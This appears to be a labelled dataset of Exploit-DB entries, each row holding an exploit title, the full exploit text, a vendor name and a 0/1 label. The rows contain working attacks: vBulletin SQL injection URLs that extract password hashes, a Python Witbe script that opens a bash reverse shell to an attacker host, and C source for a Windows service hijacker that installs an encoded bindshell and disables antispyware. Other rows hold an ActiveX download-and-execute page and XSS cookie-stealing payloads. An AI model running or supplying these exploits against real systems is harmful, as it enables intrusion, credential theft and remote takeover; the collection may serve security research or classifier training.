40751,"vBulletin 3.6.0 < 4.2.3 - 'ForumRunner' SQL Injection ################################################################################################## #Exploit Title : vBulletin <= 4.2.3 SQL Injection (CVE-2016-6195) #Author        : Manish Kishan Tanwar AKA error1046 (https://twitter.com/IndiShell1046) #Date          : 25/08/2015 #Love to       : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Jagriti,Kishan Singh and ritu rathi #Tested At  : Indishell Lab(originally developed by Dantalion) ##################################################################################################   //////////////////////// /// Overview: ////////////////////////   VBulletin version 3.6.0 through 4.2.3 are vulnerable to SQL injection vulnerability in vBulletin core forumrunner addon.  Vulnerability was analized and documented by Dantalion (https://enumerated.wordpress.com/2016/07/11/1/)  so credit goes to Dantalion only :)          //////////////// ///  POC   //// ///////////////  SQL Injection payload to enumerate table names ---------------------------------------------- http://forum_directory/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.tables)where (table_schema=database()) and (0x00) in (@x:=concat(@x,0x3c62723e,table_name))))x),5,6,7,8,9,10-- -   SQL Injection payload to enumerate column names from table ""user"" ---------------------------------------------------------------- http://forum_directory/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.columns)where (table_name=0x75736572) and (0x00) in (@x:=concat(@x,0x3c62723e,column_name))))x),5,6,7,8,9,10-- -   SQL Injection payload to enumerate username,password hash and salt from ""user"" table ---------------------------------------------------------------------------------- http://forum_directory//forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (user)where (0x00) in (@x:=concat(@x,0x3c62723e,username,0x3a,password,0x3a,salt))))x),5,6,7,8,9,10-- -  ///////////////// exploit code ends here                                      --==[[ Greetz To ]]==-- ############################################################################################ #Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba, #Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad, #Hackuin,Alicks,mike waals,Suriya Prakash, cyber gladiator,Cyber Ace,Golden boy INDIA, #Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk,Bikash Dash #############################################################################################                              --==[[Love to]]==-- # My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi, #Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Jagriti,Salty, Hacker fantastic, Jennifer Arcuri and Don(Deepika kaushik)                        --==[[ Special Fuck goes to ]]==--                             <3  suriya Cyber Tyson <3",vbulletin,1
40462,"Witbe - Remote Code Execution #!/usr/bin/python # Exploit Title: Witbe RCE (Remote Code Execution) # Exploit Author: BeLmar # Date: 05/10/2016 # DEMO : https://youtu.be/ooUFXfUfIs0 # Contact : hb.mz093@gmail.com # Vendor Homepage: http://www.witbe.net # Tested on: Windows7/10 & BackBox # Category: Remote Exploits  import urllib import urllib2 import os  print "" M    MW    M  M  XXMMrX, 2Mr72S   MW7XS""                              print "" MM   MM   M2  M    SM    MM   MM  M    ""                              print ""  M  M ZM  M   M    XM    MMir0M   MMrXS""                               print ""  MM M  M M:   M    SM    MM   ZM  M2   ""                              print ""   MMa  MMM    M    ZM    MM   XM  M    ""                               print ""   XM    M     M    iM    8MZ8W8   MM8BB""  print ""             EXPLOIT BY BELMAR          "" print """"  print ""Run NetCat Listner"" # First Run Netcat Listner   rhost = raw_input('RHOST: ') lhost = raw_input('LHOST: ') lport = raw_input('LPORT: ')  url = 'http://'+rhost+'/cgi-bin/applyConfig.pl' user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36' values = {'auth_login': '', #Leave it as it is           'auth_pwd': '',   #Leave it as it is           'file': 'set|bash -i >& /dev/tcp/'+lhost+'/'+lport+' 0>&1' }  data = urllib.urlencode(values) req = urllib2.Request(url, data) response = urllib2.urlopen(req) the_page = response.read()",Witbe,1
21540,"Microsoft SQL Server 2000 - 'SQLXML' Buffer Overflow (PoC) source: https://www.securityfocus.com/bid/5004/info  SQLXML is a component of SQL Server 2000, which enables SQL servers to receive and send database queries via XML (Extensible Markup Language) format. Such queries can be sent using various methods of communication, one of which is via HTTP. SQLXML HTTP components reside in a virtual directory on a web server and are not enabled by default, SQLXML ISAPI extensions run with LocalSystem privileges.  A buffer overflow issue has been discovered in the SQLXML ISAPI extension that handles data queries over HTTP(SQLXML HTTP).  It is possible for a user to initiate the overflow by connecting to a host and submitting malformed data.  This issue has been reported to exist in SQL Server 2000 Gold, other versions may be vulnerable as well.   IIS-Server/Nwind/Template/catalog.xml?contenttype=text/AAAA...AAA  This uses a 'template' file instead of a direct query to cause inetinfo.exe to crash.",Microsoft,1
24982,"Bolthole Filter 2.6.1 - Address Parsing Buffer Overflow source: https://www.securityfocus.com/bid/11977/info  Bolthole Filter is prone to a buffer overflow vulnerability. This issue is exposed when the software parses email address data.  If successfully exploited, this vulnerability could result in execution of arbitrary code in the context of the process.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/24982.zip",Bolthole,1
1465,"Microsoft Windows - ACLs Privilege Escalation (2) /*  * Privilege Scalation for Windows Networks using weak Service restrictions v2.0  * (c) 2006 Andres Tarasco AcuÃ±a ( atarasco _at_ gmail.com )  * Date: February 6, 2006 - http://www.haxorcitos.com  * http://microsoft.com/technet/security/advisory/914457.mspx  *  * ---------------------------------------  * LIST OF WELL KNOWN VULNERABLE SERVICES  * ---------------------------------------  *  * * Windows XP with sp2  *  - As Power User:  *    service: DcomLaunch ( SYSTEM )  *    Service: UpnpHost ( Local Service )  *    Service: SSDPSRV (Local Service)  *    Service: WMI (SYSTEM) <- sometimes as user also..  *  - As User:  *    Service: UpnpHost ( Local Service )  *    Service: SSDPSRV (Local Service)  *  - As Network Config Operators:  *    service: DcomLaunch ( SYSTEM )  *    Service: UpnpHost ( Local Service )  *    Service: SSDPSRV (Local Service)  *    Service: DHCP ( SYSTEM )  *    Service: NetBT (SYSTEM - .sys driver)  *    Service DnsCache (SYSTEM)  *  * * Windows 2000  *  - As Power user  *    service: WMI (SYSTEM)  *  *  * Third Part software (local & remote code execution)  *    Service: [Pml Driver HPZ12] (HP Software - C:\WINNT\system32\spool\DRIVERS\W32X86\3\HPZipm12.exe)  *    -Granted Full Control to Everyone Group.  *  *    Service: [Autodesk Licensing Service] (Autocad - C:\program files\Common files\Autodesk Shared\Service\AdskScSrv.exe)  *    -Maybe related to: https://www.securityfocus.com/bid/16472  *    -Autodesk Multiple Products Remote Unauthorized Access Vulnerability  *  *  * IMPORTANT!! You should execute this tool without Admin privileges on the target system  *  srvcheck.exe -? for information about usage.  *  * NOTE: This code compiles under Borland C++ Builder  * */ #include <stdio.h> #include <windows.h>  //Functions void doFormatMessage( unsigned int dwLastErr ); void usage(void); DWORD StartModifiedService(SC_HANDLE SCM, char *srv, BOOL dbg); void ListVulnerableService(char *host); char *GetOwner(char *servicio);   //Remove previously created files char init[]=""cmd.exe /c rd /Q /S \\HXR""; char antispyware[]=""taskkill.exe  /IM gcasDtServ.exe""; char firewall[]=""cmd.exe /c netsh firewall add portopening TCP 8080 SrvCheck ENABLE ALL"";   char EncodedBackdoor[]= ""cmd.exe /c md \\HXR && "" //Final Bindshell-code is an 804 bytes binary //Encoded with Tarako Exe2vbs (http://www.haxorcitos.com) ""echo f= \""4D5A000001z3z04z5z01z9z40z35z50z3z665AB44CCD21z10z504500004C01030048585221z8zE0000F010B010600A8z3zBCz7zC0010000C00100006802z4z400004z3z04z3z04z7z04z7z2403000028\"">\\HXR\\a.vbs && "" ""echo f=f ^& \""02z6z02z5z10000010z4z10000010z6z10z11z880200003Cz83z6802000020z27z2E576F70z4zA6z3zC0010000A8z3zC001z14z200000602E615434z4zB6z3z68020000B8z3z6802z14z400000402E54\"">>\\HXR\\a.vbs && "" ""echo f=f ^& \""524Bz4z04z3z2003000004z3z2003z14z400000C0558BEC81ECF4010000538D850CFEFFFF56506801010000FF157402400033F65656566A066A016A02FF15700240008BD88D45F06A10505366C745F002\"">>\\HXR\\a.vbs && "" ""echo f=f ^& \""0066C745F21F908975F4FF15780240006A0153FF157C0240008D45F0565053FF15800240008945EC8945E88945E48D459C508D45AC505656566A015656682003400056C745AC44z3z668975DCC745D801\"">>\\HXR\\a.vbs && "" ""echo f=f ^& \""0100008975B88975B48975E0FF15680240005E5BC9C210z3zFE02z6zE402000073000080020000800D00008001000080z4zCC02z10zF202000070020000C402z10z100300006802z22zFE02z6zE40200\"">>\\HXR\\a.vbs && "" ""echo f=f ^& \""0073000080020000800D00008001000080z4z3D00575341536F636B65744100005753325F33322E646C6C0000440043726561746550726F636573734100004B45524E454C33322E646C6Cz4z636D6400\"">>\\HXR\\a.vbs && "" ""echo i=1 : t = \""\"" : While i^<=len(f) : If mid(f,i,1) = \""z\"" then>>\\HXR\\a.vbs && "" ""echo a=i+1 : k = 0 : while mid(f,a,1)^<^>\""z\"" : k = k*10 + mid(f,a,1) : a = a+1 : WEnd : i = a+1 : for a=1 to k : t = t + \""00\"" : Next>>\\HXR\\a.vbs && "" ""echo ElseIf mid(f,i,1) ^<^> \""z\"" then : t = t ^& mid(f,i,2) : i = i+2 >>\\HXR\\a.vbs && "" ""echo end if : WEnd : Set o = CreateObject(\""Scripting.FileSystemObject\"") >>\\HXR\\a.vbs && "" ""echo Set n = o.CreateTextFile(\""\\HXR\\a.exe\"", ForWriting) : i = 1 : while i ^< len(t)>>\\HXR\\a.vbs && "" ""echo f = Int(\""&H\"" ^& Mid(t, i, 2)) : n.Write(Chr(f)) : i = i+2 : WEnd : n.Close>>\\HXR\\a.vbs && "" ""echo Set s=CreateObject(\""WScript.Shell\"") : s.run(\""\\HXR\\a.exe\"")>>\\HXR\\a.vbs &&"" ""\\HXR\\a.vbs /B"";  BYTE LIST=0,HELP=0,BACKDOOR=1, STOP=0; char RemoteHost[256]; char permission[256];  /******************************************************************************/ int main(int argc, char* argv[]) {   SC_HANDLE SCM,Svc;  DWORD ret,len;  char CurrentUserName[256];  char *newPath=NULL;  char *host=NULL;  char *user=NULL;  char *pass=NULL;  char *srv=NULL;  int i;  NETRESOURCE NET;   SERVICE_STATUS_PROCESS StopStatus;   printf("" Services Permissions checker v2.0\n"");  printf("" (c) 2006 Andres Tarasco - atarasco%cgmail.com\n\n"",'@');   if (argc==1) usage();  for (i=1;i<argc;i++) {     if ( (strlen(argv[i])==2) && (argv[i][0]=='-') ) {         switch (argv[i][1]) {             case 'l': LIST=1; break;             case 'm': srv=argv[i+1]; i=i+1;break;             case 'u': if (!host) usage(); user=argv[i+1]; i=i++; break;             case 'p': if (!host) usage(); pass=argv[i+1]; i=i++; break;             case 'H': host=argv[i+1]; i=i++; break;             case 'c': newPath=argv[i+1]; i=i+1; BACKDOOR=0; break;             case 's': STOP=1; break;             case '?': HELP=1; usage(); break;             default: printf(""Unknown Parameter: %s\n"",argv[i]);usage(); break;         }     }  }   if ((!LIST) && (!srv) )usage();   if (host) { //InicializaciÃ³n.. ConexiÃ³n al sistema remoto..     printf(""[+] Trying to connect to remote SCM\n"");     sprintf(RemoteHost,""\\\\%s\\IPC$"",host);     printf(""[+] Host: %s\n"",RemoteHost);     printf(""[+] Username: %s\n"",user);     printf(""[+] Password: %s\n"",pass);      NET.dwType = RESOURCETYPE_ANY;     NET.lpProvider = NULL;     NET.lpLocalName=NULL;     NET.lpRemoteName = (char *)RemoteHost;     ret=WNetAddConnection2(&NET,pass,user,CONNECT_COMMANDLINE);//CONNECT_PROMPT);//CONNECT_UPDATE_PROFILE);      //verificaciÃ³n de errores de conexiÃ³n...     if ( (ret!=NO_ERROR) && (user !=NULL) ) {         if (ret==1219) { //connection already created. Disconnecting..             printf(""[-] Credentials mismatch. Removing old connection\n"");             WNetCancelConnection2(RemoteHost,NULL,TRUE);             ret=WNetAddConnection2(&NET,pass,user,CONNECT_UPDATE_PROFILE);         } else {             if (ret==1326) { //usuario o contraseÃ±a incorrecta              if (strchr(user,'\\')==NULL) {                  sprintf(CurrentUserName,""localhost\\%s"",user);                 printf(""[-] Unknown Username or password\n"");                 printf(""[+] Trying \""%s\"" as new username\n"",CurrentUserName);                 ret=WNetAddConnection2(&NET,pass,CurrentUserName,CONNECT_UPDATE_PROFILE);              }             }         }         if (ret!=NO_ERROR) {             printf(""WNetAddConnection Failed to %s (%s/ %s)\n"",RemoteHost,user,pass);             doFormatMessage(GetLastError());             exit(-1);         }     }     printf(""[+] Network Connection OK\n"");   } else {     printf(""[+] Trying to enumerate local resources\n"");     len=sizeof(CurrentUserName)-1;     GetUserName(  CurrentUserName,&len);     printf(""[+] Username: %s\n"",CurrentUserName);  }   if (LIST) {     ListVulnerableService(host);     exit(1); }  //SERVICE HACKS HERE!!   SCM = OpenSCManager(host,NULL,STANDARD_RIGHTS_WRITE | SERVICE_START ); if (!SCM){     printf(""[-] OpenScManager() FAILED\n"");     doFormatMessage(GetLastError());     exit(-1); } if (STOP) {     Svc = OpenService(SCM,srv,SERVICE_CHANGE_CONFIG | STANDARD_RIGHTS_WRITE | SERVICE_STOP); } else {     Svc = OpenService(SCM,srv,SERVICE_CHANGE_CONFIG | STANDARD_RIGHTS_WRITE); }  if (Svc==NULL) {     printf(""[-] Unable to open Service %s\n"",srv);     exit(-1); }  //        printf(""[+] Using leetz skillz to execute backdoor =)\n"");  //Delete previous installed  if (STOP) {  printf(""[+] Stopping previously running instances...\n"");  if (ControlService(Svc,SERVICE_CONTROL_STOP,&StopStatus)!=0) {     doFormatMessage(GetLastError());   }  exit(-1); }    if (BACKDOOR) {     printf(""[+] Uninstalling previous backdoors\n"");     ret=ChangeServiceConfig(         Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,         SERVICE_ERROR_IGNORE,init,NULL,NULL,"""",         NULL,NULL,NULL);          if (ret!=0) StartModifiedService(SCM,srv,0);      printf(""[+] Granting Remote bindshell Execution..\n"");     ret=ChangeServiceConfig(         Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,         SERVICE_ERROR_IGNORE,firewall,NULL,NULL,"""",         NULL,NULL,NULL);         if (ret!=0) StartModifiedService(SCM,srv,0);     printf(""[+] Shutting down remote antispyware Service =)\n"");     ret=ChangeServiceConfig(         Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,         SERVICE_ERROR_IGNORE,antispyware,NULL,NULL,"""",         NULL,NULL,NULL);         if (ret!=0) StartModifiedService(SCM,srv,0);     printf(""[+] Installing Backdoor Code...\n"");     ret=ChangeServiceConfig(         Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,         SERVICE_ERROR_IGNORE,EncodedBackdoor,NULL,NULL,"""",         NULL,NULL,NULL);  } else { //Ejecutando parametros especificados con -c     printf(""[+] Sending custom commands to the service\n"");     ret=ChangeServiceConfig(         Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,         SERVICE_ERROR_IGNORE,newPath,NULL,NULL,"""",         NULL,NULL,NULL);  }   if (ret!=0) {     printf(""[+] The service have been succesfully modified =)\n"");     CloseServiceHandle(Svc);     StartModifiedService(SCM,srv,1);  } else {     printf(""[-] Service modification Failed\n"");     doFormatMessage(ret);  }  CloseServiceHandle(SCM);  if (host) WNetCancelConnection2(RemoteHost,NULL,TRUE);  return(1); }  /******************************************************************************/ void doFormatMessage( unsigned int dwLastErr )  {     LPVOID lpMsgBuf;     FormatMessage(         FORMAT_MESSAGE_ALLOCATE_BUFFER |         FORMAT_MESSAGE_IGNORE_INSERTS |         FORMAT_MESSAGE_FROM_SYSTEM,         NULL,         dwLastErr,         MAKELANGID( LANG_NEUTRAL, SUBLANG_DEFAULT ),         (LPTSTR) &lpMsgBuf,         0,         NULL );     printf(""ErrorCode %i: %s\n"", dwLastErr, lpMsgBuf);     LocalFree( lpMsgBuf  ); }  /******************************************************************************/  DWORD StartModifiedService(SC_HANDLE SCM, char *srv, BOOL dbg) {   SC_HANDLE Svc;  DWORD Error;  SERVICE_STATUS_PROCESS StartStatus;  DWORD dwByteNeeded;   DWORD dwOldCheckPoint;  DWORD dwStartTickCount;  DWORD dwWaitTime;   Svc= OpenService( SCM, srv, SERVICE_ALL_ACCESS);   if (Svc==NULL) {     if (dbg) printf(""[-] Unable to reopen service for starting..\n"");     return(-1);  } else {     if (dbg) printf(""[+] Service Opened. Trying to Start... (wait a few seconds)\n"");  }   if (!StartService(Svc,0,NULL)) {     Error=GetLastError();     if (Error==1053) {         if (dbg) {             printf(""[+] StarteService() Error due to a non service application execution\n"");             printf(""[+] Ignore it. Your application should be executed =)\n"");             if (BACKDOOR) {                 printf(""[+] Now connect to port 8080 and enjoy your new privileges\n"");             }         }     } else {         if (dbg) {             printf(""[-] Unable to start Service :/\n"");             doFormatMessage(Error);         }         return(Error);     }   } else {         if (dbg) printf(""[+]  Starting Service....\n"");         if (!QueryServiceStatusEx(             Svc,             // handle to service             SC_STATUS_PROCESS_INFO, // info level             &StartStatus,              // address of structure             sizeof(SERVICE_STATUS_PROCESS), // size of structure             &dwByteNeeded) )              // if buffer too small         {             if (dbg) printf(""[-] Unable to QueryServiceStatusEx() \n"");             return(-2);         } else {              //RevisiÃ³n de si arranca el servicio..             // Save the tick count and initial checkpoint.             dwStartTickCount = GetTickCount();             dwOldCheckPoint = StartStatus.dwCheckPoint;             while (StartStatus.dwCurrentState == SERVICE_START_PENDING)             {                 if (dbg) printf(""Wait Time: %i\n"",StartStatus.dwWaitHint);                 dwWaitTime = StartStatus.dwWaitHint  / 10;                 if( dwWaitTime < 1000 )                     dwWaitTime = 1000;                 else if ( dwWaitTime > 10000 )                     dwWaitTime = 10000;                 Sleep( dwWaitTime );                 // Check the status again.                  if (!QueryServiceStatusEx(                     Svc,             // handle to service                     SC_STATUS_PROCESS_INFO, // info level                     &StartStatus,              // address of structure                     sizeof(SERVICE_STATUS_PROCESS), // size of structure                     &dwByteNeeded ) )              // if buffer too small                 {                     if (dbg) printf(""[-] Unable to QueryServiceStatusEx() \n"");                     return(-2);                 }                 if ( StartStatus.dwCheckPoint > dwOldCheckPoint )                 {                 // The service is making progress.                     dwStartTickCount = GetTickCount();                     dwOldCheckPoint = StartStatus.dwCheckPoint;                 } else {                     if(GetTickCount()-dwStartTickCount > StartStatus.dwWaitHint)                     {                         // No progress made within the wait hint                         if (dbg) printf(""el servicio no se ha arrancado...\n"");                         break;                     }                 }             }         }         CloseServiceHandle(Svc);         if (StartStatus.dwCurrentState == SERVICE_RUNNING)         {             if (dbg) printf(""[+] StartService SUCCESS.\n"");             return 1;         }         else         {             if (dbg) printf(""\n[-] Service not started. \n"");         }   }   return(0); }   /******************************************************************************/ /******************************************************************************/ void usage(void) {     printf("" Usage:\n\t-l\t\t list vulnerable services\n"");     printf(""\t-m <service>\t modify the configuration for that service\n"");     printf(""\t-c <command>\t Command to execute throw remote service\n"");     printf(""\t\t\t  by default. bindshell application will be used\n"");     printf(""\t-H <Host>\t specify a remote host to connect ip/netbiosname)\n"");     printf(""\t-u <user>\t if not seletected Default logon credentials used)\n"");     printf(""\t-p <password>\t if not used Default logon credentials used)\n"");     printf(""\t-?\t\t Extended information with samples\n"");      if (HELP) {      printf("" examples:\n"");      printf(""\tsrvcheck.exe -l (list local vulnerabilities)\n"");      printf(""\tsrvcheck.exe -m service (spawn a shell at port 8080)\n"");      printf(""\tsrvcheck.exe -m service -c \""cmd.exe /c md c:\\PWNED\""\n""),      printf(""\tsrvcheck -l -H host (list remote vulnerabilities)\n"");    }    exit(-1); }   /******************************************************************************/ void ListVulnerableService(char *host) {  SC_HANDLE SCM;  SC_HANDLE Svc;  DWORD nResumeHandle;  DWORD dwServiceType;  LPENUM_SERVICE_STATUS_PROCESS lpServices;  DWORD nSize = 0;  DWORD nServicesReturned;  unsigned int n;  unsigned int l=0;  DWORD dwByteNeeded;  LPQUERY_SERVICE_CONFIG lpConfig;  char *p;      SCM = OpenSCManager(host,NULL,SC_MANAGER_ENUMERATE_SERVICE);     if (!SCM){         printf(""[-] OpenScManager() FAILED\n"");         doFormatMessage(GetLastError());         exit(-1);     }     nResumeHandle = 0;     dwServiceType = SERVICE_WIN32 | SERVICE_DRIVER;     lpServices = (LPENUM_SERVICE_STATUS_PROCESS) LocalAlloc(LPTR, 65535);     if (!lpServices) {         printf(""[-] CRITICAL ERROR: LocalAlloc() Failed\n"");         exit(-1);     }     memset(lpServices,'\0',sizeof(lpServices));     if (EnumServicesStatusEx(SCM, SC_ENUM_PROCESS_INFO,         dwServiceType, SERVICE_STATE_ALL,         (LPBYTE)lpServices, 65535,         &nSize, &nServicesReturned,         &nResumeHandle, NULL) == 0)     {         printf(""EnumServicesStatusEx FAILED\n"");         exit(-1);     }      printf(""[+] Listing Vulnerable Services...\n"");     for (n = 0; n < nServicesReturned; n++) {         Svc = OpenService(SCM,lpServices[n].lpServiceName, SERVICE_CHANGE_CONFIG | SC_MANAGER_ENUMERATE_SERVICE |GENERIC_READ);         if (Svc!=NULL) {             l++;             printf(""\n    [%s]\t\t%s\n"",lpServices[n].lpServiceName, lpServices[n].lpDisplayName);             printf(""    Status: 0x%x\n"",lpServices[n].ServiceStatusProcess.dwCurrentState);             if (!host) {                 p=GetOwner(lpServices[n].lpServiceName);                 if (p) {                     printf(""    Context:\t\t%s\n"",p);                 }              }     		dwByteNeeded = 0; 		    lpConfig = (LPQUERY_SERVICE_CONFIG) LocalAlloc(LPTR, 1024*8); 		    if (QueryServiceConfig(Svc, lpConfig, 1024*8, &dwByteNeeded)!=0) {                 printf(""    Parameter:\t\t%s\n"",lpConfig->lpBinaryPathName);             }else {                 doFormatMessage(GetLastError());             }         }     }     printf(""\n[+] Analyzed %i Services in your system\n"",nServicesReturned);     if (l>0) {         printf(""[+] You were Lucky. %i vulnerable services found\n"",l);     }   else {         printf(""[+] Your system is secure! Great! :/\n"");     }      if (host) WNetCancelConnection2(RemoteHost,NULL,TRUE);     CloseServiceHandle(SCM);     LocalFree(lpServices);     exit(1); }  /*****************************************************************************/  char *GetOwner(char *servicio) {   char path[256];  HKEY hReg;  DWORD len=sizeof(permission);   sprintf(path,""SYSTEM\\CurrentControlSet\\Services\\%s"",servicio);  if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,path,0,KEY_QUERY_VALUE,&hReg)== ERROR_SUCCESS ) {     if (RegQueryValueEx(hReg,""ObjectName"",NULL,NULL,permission,&len)==ERROR_SUCCESS) {         RegCloseKey(hReg);         return(permission);     }     RegCloseKey(hReg);  }  return(NULL); }  // milw0rm.com [2006-02-12]",.haxorcitos.,0
47419,"WP Server Log Viewer 1.0 - 'logfile' Persistent Cross-Site Scripting # Exploit Title: WP Server Log Viewer 1.0 - 'logfile' Persistent Cross-Site Scripting # Date: 2019-09-10 # Exploit Author: strider # Software Link: https://github.com/anttiviljami/wp-server-log-viewer # Version: 1.0 # Tested on: Debian 10 Buster x64 / Kali Linux # CVE : None  ====================================[Description]==================================== This plugin allows you to add logfiles via wp-admin. The problem here is that the file paths are stored unfiltered/unescaped. This gives the possibility of a persistent XSS attack.   ====================================[Codepart]====================================  if( isset( $_GET['action'] ) && 'new' === $_GET['action'] && isset( $_GET['logpath'] ) ) {       // new log was added       $logs = get_option( 'server_logs' );       if( is_null( $logs ) ) {         $logs = [];       }        $log = trim( $_GET['logpath'] ); //only trimmed string no escaping       $logs[] = $log; //here the log will be added without security checks       $logs = array_values( $logs );        $index = array_search( $log, $logs );        update_option( 'server_logs', $logs );        wp_safe_redirect( admin_url('tools.php?page=wp-server-log-viewer&log=' . $index) );     }    ====================================[Proof of Concept]==================================== Add new log file to the plugin. paste this exploit into the form and submit it.  <img src=# onerror=alert(document.cookie);>log.txt  It tries to render an image and triggers the onerror event and prints the cookie. in the tab you see the log.txt",WP,1
30511,"Gurur Haber 2.0 - 'Uyeler2.php' SQL Injection source: https://www.securityfocus.com/bid/25368/info  Gurur Haber is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/uyeler2.php?id=-1%20union+select+0,kadi,2,id,sifre,5,6,7,8,9,10,11+from+uyeler",Gurur,1
28884,"BlooMooWeb 1.0.9 - ActiveX Control Multiple Vulnerabilities source: https://www.securityfocus.com/bid/20827/info  BlooMooWeb ActiveX control is prone to multiple vulnerabilities, including:  - an arbitrary file-download issue - an arbitrary code-execution issue - an arbitrary file-deletion issue.   An attacker can exploit these issues to download arbitrary files, execute arbitrary code within the context of the affected application, and delete arbitrary files.  <html> <head> <script language=""JavaScript"">  var binaryUrl=""http://some_attacker_controlled_domain/attackerfile.exe"";  function spawn2() {         aa1=o2obj.GetInstallationDir(null);         aa2=""BlooMooWEB.exe"";         o2obj.BW_DownloadFile(binaryUrl,aa1+aa2,""callback001""); }  function callback001( msgCode, param1, param2, param3 ) {         if(msgCode == 'DOWNLOAD_COMPLETE' )         {                 o2obj.BW_LaunchGame(""treleferekuku"");         } }  </script> </head>  <body onload=""spawn2()""> <object ID=""o2obj"" WIDTH=0 HEIGHT=0     CLASSID=""CLSID:22E9EFBA-114C-4DA0-AE72-D8F2C7138002"" </object> </body> </html>",BlooMooWeb,1
24263,"Mozilla 1.7 - External Protocol Handler source: https://www.securityfocus.com/bid/10681/info  Mozilla Internet Browser is reported prone to a weakness that may permit an external protocol to be called without any user interaction. This may expose Mozilla users to vulnerabilities that exist in the underlying operating system or in the software that is the default handler for a registered protocol.  Vulnerabilities in the applications that are invoked by a protocol, and vulnerabilities in the way a called protocol is handled by the host operating system may be exploited using this weakness in the Mozilla browser.  1. VICTIM VISITS A SHARED FOLDER NAMED ""shared"" ON A SERVER NAMED ""X-6487ohu4s6x0p"". THIS WILL CREATE A SHORTCUT NAMED ""shared on X-6487ohu4s6x0p"" IN THE FOLDER AT ""shell:NETHOOD"" 2. VICTIM OPENS THIS HTML FILE WHICH EXECUTES A FILE NAMED ""fileid.exe"" IN THE ""shared"" FOLDER: <IMG SRC=""shell:NETHOOD\shared on X-6487ohu4s6x0p\fileid.exe"">",Mozilla,1
15824,"Pligg CMS 1.1.2 - Blind SQL Injection / Cross-Site Scripting Credit: Michael Brooks  Special thanks to Eric Heikkinen for patching these quickly.  Blind SQL Injection http://host/pligg_1.1.2/search.php?adv=1&status= 'and+sleep(9)or+sleep(9)or+1%3D' &search=on&advancesearch= Search +&sgroup=on&stags=0&slink=on&scategory=on&scomments=0&suser=0  XSS: http://host/pligg_1.1.2/?xss='onmouseover=alert(1);// http://host/pligg_1.1.2/?search="" onclick=alert(1) a=",pligg,1
45911,"WebKit JIT - 'ByteCodeParser::handleIntrinsicCall' Type Confusion /*     case ArrayPushIntrinsic: {         ...          if (static_cast<unsigned>(argumentCountIncludingThis) >= MIN_SPARSE_ARRAY_INDEX)             return false;          ArrayMode arrayMode = getArrayMode(m_currentInstruction[OPCODE_LENGTH(op_call) - 2].u.arrayProfile, Array::Write);                  ...     }  This code always assumes that the current instruction is an op_call instruction. But that code can be reached from op_get_by_id or op_get_by_val instructions using getters. As an op_get_by_val instruction is smaller than an op_call instruction in size, this also can lead to an OOB read.  Note that the handlers for ArraySliceIntrinsic, ArrayIndexOfIntrinsic and ArrayPopIntrinsic have the same pattern.  PoC: */  Array.prototype.__defineGetter__('a', Array.prototype.push);  function opt() {     let arr = new Array(1, 2, 3, 4);     arr['a' + '']; }  for (let i = 0; i < 1000; i++) {     opt(); }",WebKit,1
44816,"Grid Pro Big Data 1.0 - SQL Injection # Exploit Title: Grid Pro Big Data 1.0 - 'test.php' SQL Injection # Dork: N/A # Date: 30.05.2018 # Exploit Author: Kağan Çapar # Vendor Homepage: https://codecanyon.net/item/grid-pro-big-data-table-view-data-grid-with-sort-search-and-filter-for-large-mysql-tables/20395348  # Version: 1.0 # Category: Webapps # Tested on: Kali Linux # Description : The multiple parameters in the 'test.php' query contain SQLi vulnerabilities. ==================================================== # PoC : SQLi :   POST /release/pro_grid_big_data/php/test.php HTTP/1.1 Host: site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://site.com/release/pro_grid_big_data/index.html Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 430 Connection: keep-alive page=1&on_home=5&table_name=be&params%5B0%5D%5Btype%5D=text&params%5B0%5D%5Bvalue%5D=&params%5B0%5D%5Bname%5D=Name&params%5B1%5D%5Btype%5D=text&params%5B1%5D%5Bvalue%5D=&params%5B1%5D%5Bname%5D=Surname&params%5B2%5D%5Btype%5D=num_range&params%5B2%5D%5Bvalue%5D%5B%5D=&params%5B2%5D%5Bvalue%5D%5B%5D=&params%5B2%5D%5Bname%5D=Age&params%5B3%5D%5Btype%5D=date&params%5B3%5D%5Bvalue%5D=&params%5B3%5D%5Bname%5D=Born_date&ordering=none   Parameter: on_home (POST)     Type: UNION query     Title: Generic UNION query (NULL) - 4 columns     Payload: page=2&on_home=5 UNION ALL SELECT CONCAT(CONCAT('qjbqq','vVWAgYsZnIsAkqERYDgZibFieBTaDlfAymtKvnaO'),'qxbpq'),NULL,NULL,NULL-- LEgG&table_name=be&params[0][type]=text&params[0][value]=&params[0][name]=Name&params[1][type]=text&params[1][value]=&params[1][name]=Surname&params[2][type]=num_range&params[2][value][]=&params[2][value][]=&params[2][name]=Age&params[3][type]=date&params[3][value]=&params[3][name]=Born_date&ordering=none  